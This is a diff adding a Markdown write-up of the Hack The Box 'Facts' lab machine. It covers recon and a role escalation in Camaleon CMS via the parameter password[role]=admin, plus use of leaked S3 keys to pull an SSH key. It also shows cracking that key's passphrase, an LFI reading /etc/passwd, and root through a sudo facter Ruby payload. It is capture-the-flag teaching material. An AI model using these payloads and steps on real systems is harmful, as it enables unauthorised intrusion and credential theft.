@@ -1,0 +1,218 @@
+---
+title: Facts
+date: '2026-02-19'
+description: 'Writeup for the Facts machine .'
+type: writeup
+platform: hackthebox
+difficulty: easy
+tags:
+  - EASY
+  - HTB
+  - LINUX
+  - MINIO
+  - RUBY
+cover: /mc/images/tokyo.jpg
+---
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+In this write-up, we start a new machine from **Hack The Box (HTB) Season 10**.
+
+## **Recon — Nmap**
+
+We start with a fast service scan:
+
+```bash
+nmap 10.129.10.179 -sVC -T5
+
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-01 15:50 -0500
+Warning: 10.129.10.179 giving up on port because retransmission cap hit (2).
+Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 98.96% done; ETC: 15:51 (0:00:00 remaining)
+Nmap scan report for 10.129.10.179
+Host is up (0.50s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
+|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
+80/tcp open  http    nginx 1.26.3 (Ubuntu)
+|_http-server-header: nginx/1.26.3 (Ubuntu)
+|_http-title: Did not follow redirect to http://facts.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 40.67 seconds
+```
+
+Port 80 is open, which indicates that a web application is running on the target.
+
+## **Web Enumeration — Fuzzing**
+
+The first step is to enumerate the application by fuzzing its content in order to discover hidden endpoints. This is done using ffuf.
+
+```bash
+ffuf -u http://facts.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -fr "WELCOME"
+
+400                     [Status: 200, Size: 6685, Words: 993, Lines: 115, Duration: 796ms]
+404                     [Status: 200, Size: 4836, Words: 832, Lines: 115, Duration: 714ms]
+500                     [Status: 200, Size: 7918, Words: 1035, Lines: 115, Duration: 689ms]
+admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 541ms]
+admin.pl                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 618ms]
+admin.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 724ms]
+admin.cgi               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 752ms]
+ajax                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1566ms]
+captcha                 [Status: 200, Size: 4650, Words: 18, Lines: 12, Duration: 2023ms]
+error                   [Status: 500, Size: 7918, Words: 1035, Lines: 115, Duration: 1729ms]
+page                    [Status: 200, Size: 19593, Words: 3296, Lines: 282, Duration: 2483ms]
+post                    [Status: 200, Size: 11308, Words: 1414, Lines: 152, Duration: 2108ms]
+robots.txt              [Status: 200, Size: 99, Words: 12, Lines: 2, Duration: 1603ms]
+robots                  [Status: 200, Size: 33, Words: 2, Lines: 1, Duration: 1688ms]
+rss                     [Status: 200, Size: 183, Words: 20, Lines: 9, Duration: 1567ms]
+search                  [Status: 200, Size: 19187, Words: 3276, Lines: 272, Duration: 1766ms]
+sitemap                 [Status: 200, Size: 3508, Words: 424, Lines: 130, Duration: 1602ms]
+sitemap.gz              [Status: 500, Size: 7918, Words: 1035, Lines: 115, Duration: 1553ms]
+sitemap.xml             [Status: 200, Size: 3508, Words: 424, Lines: 130, Duration: 1665ms]
+up                      [Status: 200, Size: 73, Words: 4, Lines: 1, Duration: 1526ms]
+```
+
+**Interesting endpoints found**
+**`***/admin***`*** (302)*
+
+### **CMS Abuse — Role Escalation via Password Reset**
+
+While fuzzing, I inspected the source code of the home page and noticed a directory named cameleon.
+This suggests that the application may be using a CMS called Cameleon CMS.
+
+After that, I attempted to access the /admin endpoint.
+Since access was restricted, I created a regular user account and authenticated with it.
+
+By inspecting the footer of the application, it was possible to identify the CMS in use along with its version. Based on this information, we searched for known vulnerabilities affecting this version 2.9.0 of the CMS and discovered a relevant issue.
+
+### CVE-2025-2304-POC
+
+The first vulnerability allows a normal user to escalate privileges to an administrator by abusing the forgot password functionality.
+More details about this vulnerability can be found: here:
+[https://github.com/advisories/GHSA-rp28-mvq3-wf8j](https://github.com/advisories/GHSA-rp28-mvq3-wf8j).
+
+To exploit this issue, the password reset request is intercepted and modified using Burp Suite, allowing the user’s role to be escalated to administrator.
+
+![Burpsuite repeater (forget password) in Cameleon CMS](https://nutzh.top/wp-content/uploads/2026/02/Screenshot-2026-02-01-221856-1024x629.png)
+
+As shown in the Burp Suite Repeater request, there is a repeating parameter pattern such as `password[password]`.
+Based on this structure, we attempted to follow the same convention and inject our own parameter: `password[role]=administrator`.`
+`However, changing the role to administrator did not grant administrative privileges.
+As a result, we modified the payload and attempted to set the role to admin instead of administrator.
+
+![the profile of the administrator in Cameleon CMS](https://nutzh.top/wp-content/uploads/2026/02/Screenshot-2026-02-01-222552-1024x528.png)
+
+After successfully exploiting the payload password[role]=admin, the privilege escalation worked and the user was granted administrative access.
+With administrator privileges, we proceeded to further enumerate the website, focusing on the configuration and settings sections. During this phase, we discovered something new: AWS S3 credentials, specifically an access key and a secret key.
+
+After researching AWS S3 further, I looked for tools that could help enumerate and interact with the storage using the discovered credentials. Since ChatGPT did not provide a direct enumeration tool, I conducted independent research and found a tool called mc (MinIO Client).
+The mc tool can be used to interact with S3-compatible object storage services. More information about this tool can be found in the official documentation:
+[https://docs.min.io/enterprise/aistor-object-store/reference/cli/?tab=mc-alias-examples-aistor-server#quickstart](https://docs.min.io/enterprise/aistor-object-store/reference/cli/?tab=mc-alias-examples-aistor-server#quickstart)
+
+We followed the article and executed the first command as described.
+Note: It is recommended to download the mc binary directly from the official GitHub repository rather than using the default version shipped with Kali Linux.
+
+```bash
+./mc alias set facts http://facts.htb:54321 'AKIA8000E4E6FA1F82C8' '0jghRK0Vc8zluT58ZiT+Yo1Y024LyKS1B/a0I3r8'
+Added `facts` successfully.
+```
+
+## INITIAL ACCESS
+
+After configuring the tool, we listed all files stored in the facts bucket to identify any sensitive or interesting data.
+During enumeration, multiple directories were inspected, eventually revealing an .ssh directory:
+
+```bash
+./mc ls facts/internal/.ssh
+[2026-02-01 09:05:14 EST]    82B STANDARD authorized_keys
+[2026-02-01 09:05:14 EST]   464B STANDARD id_ed25519
+```
+
+A SSH key exist we downloaded it locally using the mc get command
+
+```bash
+./mc get facts/internal/.ssh/id_ed25519 .
+```
+
+### **SSH Key Cracking**
+
+The SSH private key was encrypted with a passphrase.
+To decrypt it, we used ssh2john to convert the key
+
+```bash
+ssh2john id_ed25519 > hashjohn
+```
+
+```bash
+john hashjohn --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Will run 5 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+dragonballz      (id_ed25519)     
+```
+
+### **LFI to Discover Username**
+
+although we have a valid SSH private key and its passphrase, the target SSH username is still unknown, which prevents immediate authentication. Further enumeration is therefore required to identify a valid system user associated with this key.
+
+To identify the SSH user, I continued enumerating the application and revisited the project’s GitHub repository. During this process, I discovered a function related to media handling named download_private_file_spec.rb.
+More information about this function can be found here:
+https://github.com/owen2345/camaleon-cms/blob/master/spec/requests/admin/media_controller/download_private_file_spec.rb
+
+With some basic programming knowledge (despite not being familiar with Ruby), I observed that this functionality references an endpoint called download_private_file which accepts a file parameter.
+By assembling this endpoint and controlling the file parameter, it appeared possible to exploit a Local File Inclusion (LFI) vulnerability.
+To validate this, I attempted to read the /etc/passwd file.
+
+![](https://nutzh.top/wp-content/uploads/2026/02/Screenshot-2026-02-01-232457-1024x566.png)
+
+Using the LFI vulnerability, two system users were identified: **trivia **and **william**.
+SSH authentication using the recovered private key did not work for **william**, but was successful for **trivia**: (so why does william exist is he a regular user and that is it )
+
+```bash
+ssh trivia@facts.htb -i id_ed25519
+Enter passphrase for key 'id_ed25519': dragonballz
+trivia@facts:~$ 
+```
+
+## **Privilege Escalation**
+
+Once logged in, the first step was to check for sudo permissions:
+
+```bash
+trivia@facts:~$ sudo -l
+Matching Defaults entries for trivia on facts:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User trivia may run the following commands on facts:
+    (ALL) NOPASSWD: /usr/bin/facter
+```
+
+The binary /usr/bin/facter can be executed as root without a password.
+After reviewing how facter works , it was determined that it can load external Ruby files from a user-controlled directory using the --custom-dir option. This behavior makes it vulnerable to Ruby code injection, allowing privilege escalation.
+To exploit this, a malicious Ruby file was created in a controlled directory:
+
+```bash
+trivia@facts:~$ cat /tmp/rb/rb.rb
+#!/usr/bin/env ruby
+Process::Sys.setuid(0)
+Process::Sys.setgid(0)
+exec("/bin/bash -p")
+```
+
+The binary was then executed with the custom directory option:
+
+```bash
+trivia@facts:~$ sudo /usr/bin/facter --custom-dir /tmp/rb
+root@facts:/home/trivia# whoami
+root
+```
+
+With root access obtained, both the user flag and the root flag could be read.
+The user flag was located in william’s home directory.
+
+GG
